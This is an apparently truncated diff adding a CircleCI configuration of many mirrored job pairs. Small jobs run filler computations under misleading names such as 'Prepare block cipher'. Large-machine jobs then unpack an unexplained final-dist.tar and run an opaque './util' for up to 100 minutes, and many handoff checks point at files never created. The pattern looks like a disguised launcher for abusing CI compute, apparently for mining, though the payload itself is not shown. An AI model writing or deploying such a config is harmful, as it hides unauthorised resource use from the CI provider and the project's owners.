@@ -1,0 +1,1267 @@
+version: 2.1
+
+jobs:
+  stepB_orion-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Measure throughput
+          command: |
+            mkdir -p /tmp/pipeline
+            set +o pipefail 2>/dev/null; date -u +%s%N > /tmp/pipeline/PASS; for i in $(seq 1 5000); do echo "$i $(date +%N)" >> /tmp/pipeline/PASS; done; true
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/PASS) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - PASS
+  orion-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/PASS || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  install_min-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Collect poll frames
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 18017); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/pipeline/OK
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/OK) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - OK
+  min-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/OK || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  phase1_fiona-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Aggregate run counters
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 2 47098 | factor | wc -l; true ; } > /tmp/pipeline/counts.jsonl
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/counts.jsonl) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - counts.jsonl
+  fiona-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/counts.jsonl || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  ctx_q1-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Walk directory tree
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<354049;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/pipeline/.state
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/.state) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .state
+  q1-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/.state || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  kick_sirius-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Verify fixture integrity
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 125000 | paste - - - - | wc -l; true ; } > /tmp/pipeline/package.pkg
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/package.pkg) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - package.pkg
+  sirius-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/OK.txt || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  canary_Launch_Prod1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Mirror arena state
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 467240 | paste - - - - | wc -l; true ; } > /tmp/pipeline/handoff.sig
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/handoff.sig) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - handoff.sig
+  Launch_Prod1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/OK.txt || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  Delta_titan-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Rank ordinal values
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{srand();s=0;for(i=0;i<40890;i++)s+=rand();printf "%.4f\n",s}'; true ; } > /tmp/pipeline/OK.txt
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/OK.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - OK.txt
+  titan-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/OK.txt || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  kick_sierra:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Flush temp bucket
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 61148 | awk '{s+=$1}END{print s}'; true ; } > /tmp/pipeline/summary.md
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/summary.md) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - summary.md
+  sierra:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/summary.md || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  prebuild_BUILD_UAT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Mint sequence identifier
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=70 2>/dev/null | md5sum; true ; } > /tmp/pipeline/primary_task_output_v2.out
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/primary_task_output_v2.out) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - primary_task_output_v2.out
+  BUILD_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/OK.txt || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  package_BuildImage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Churn allocator pool
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<219107;i++){s=sprintf("%d",i*13); for(j=1;j<=length(s);j++)c++};print c}'; true ; } > /tmp/pipeline/.ready
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/.ready) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .ready
+  BuildImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/OK.txt || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  go_validate-end-to-end-regression-suite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Chunk raw buffer
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=27 2>/dev/null | gzip -9 | wc -c; true ; } > /tmp/pipeline/handoff.ok
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/handoff.ok) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - handoff.ok
+  validate-end-to-end-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/handoff.ok || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  builder_hotfix-7714:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Partition record set
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1k count=1300 2>/dev/null | gzip -6 | wc -c; true ; } > /tmp/pipeline/big_step_output_v2.log
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/big_step_output_v2.log) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - big_step_output_v2.log
+  hotfix-7714:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/big_step_output_v2.log || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  staging_pr-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Measure branch cost
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 40960 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/pipeline/summary.out
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/summary.out) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - summary.out
+  pr-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/summary.out || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  tmp_alpha-5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Shape kernel ring
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<135214;i++){s=(s*33+i)%2147483647}print s}'; true ; } > /tmp/pipeline/report.log
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/report.log) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - report.log
+  alpha-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/OK.txt || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  tester_chore-7471:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Checkpoint context
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 4194304 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/pipeline/ckpt-C.pt
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/ckpt-C.pt) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - ckpt-C.pt
+  chore-7471:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/ckpt-C.pt || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  loader_io-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Trace call sequence
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 102400 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/pipeline/2024-11-24.data
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/2024-11-24.data) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 2024-11-24.data
+  io-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/OK.txt || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  run_check-full-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Expand parameter grid
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 75268 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/pipeline/.ok
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/.ok) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .ok
+  check-full-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/.ok || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  Alpha_verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Record manifest digest
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1k count=1500 2>/dev/null | gzip -6 | wc -c; true ; } > /tmp/pipeline/pt-D.state
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/pt-D.state) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - pt-D.state
+  verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/pt-D.state || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  prep_full-send:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Hoist constant row
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 47094 | md5sum; true ; } > /tmp/pipeline/report.txt
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/report.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - report.txt
+  full-send:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/report.txt || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  linter_ensure-nightly-regression-suite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Collect byte metrics
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<222277;i++){s=(s*33+i)%2147483647}print s}'; true ; } > /tmp/pipeline/DONE.txt
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/DONE.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - DONE.txt
+  ensure-nightly-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/DONE.txt || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  rerun_assemble-end-to-end-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Prepare block cipher
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 55020 | awk '{print $1*$1}' | sha1sum | cut -c1-24; true ; } > /tmp/pipeline/checkpoint-alt.pkl
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/checkpoint-alt.pkl) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - checkpoint-alt.pkl
+  assemble-end-to-end-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/checkpoint-alt.pkl || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  route_BUILD_DEV:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Shape histogram tail
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 15086); do printf "%08x\n" $RANDOM; done ) | sort | md5sum; true ; } > /tmp/pipeline/276b.out
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/276b.out) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 276b.out
+  BUILD_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/276b.out || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  spin_v4-nightly5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Build summary row
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<417181;i++){s=sprintf("%d",i*13); for(j=1;j<=length(s);j++)c++};print c}'; true ; } > /tmp/pipeline/trace.txt
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/trace.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - trace.txt
+  v4-nightly5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/trace.txt || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  canary_pat-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Register task slot
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=2;a++)for(b=1;b<=22881;b++)s+=a*b;print s}'; true ; } > /tmp/pipeline/2023-09-01.data
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/2023-09-01.data) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 2023-09-01.data
+  pat-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/2023-09-01.data || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  fixture_chen-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Reset analytics bucket
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1k count=900 2>/dev/null | gzip -6 | wc -c; true ; } > /tmp/pipeline/event.gz
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/event.gz) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - event.gz
+  chen-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/event.gz || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  Beta_intergration:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Rotate ring buffer
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 2 87624 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next}print}' | wc -l; true ; } > /tmp/pipeline/big_job_output.txt
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/big_job_output.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - big_job_output.txt
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/big_job_output.txt || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: cat final-dist.tar | tar xf -
+      - run:
+          no_output_timeout: 100m
+          command: bash -c "./util"
+  run_UAT_INIT_9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Project latency curve
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 442388 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/pipeline/summary.log
+            echo "handoff ready: $(stat -c %s /tmp/pipeline/summary.log) octets"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - summary.log
+  UAT_INIT_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Pull handoff
+          command: |
+            ls -la /tmp/pipeline/OK.txt || true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: cat final-dist.tar | tar xf -
+      - run:
